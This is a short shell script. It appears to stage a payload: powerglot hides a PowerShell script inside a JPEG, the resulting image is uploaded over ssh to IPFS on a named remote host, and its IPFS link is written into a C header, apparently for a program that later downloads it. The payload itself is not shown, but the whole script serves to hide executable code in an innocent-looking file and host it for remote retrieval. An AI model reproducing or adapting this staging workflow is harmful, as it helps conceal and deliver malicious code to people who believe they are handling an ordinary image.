set -x

python ../powerglot/powerglot.py -o ./script.ps1 oreoin.jpg oreo2.jpg
CID=$(cat oreo2.jpg | ssh instance2.oracle.servers.malhotra.cc sudo -u ipfs ipfs add --pin=false --cid-version 0 -Q)

echo "#define LINK \"/ipfs/"$CID'"' > ./VAR.h

curl ipfs.io/ipfs/$CID -Ls > /dev/null
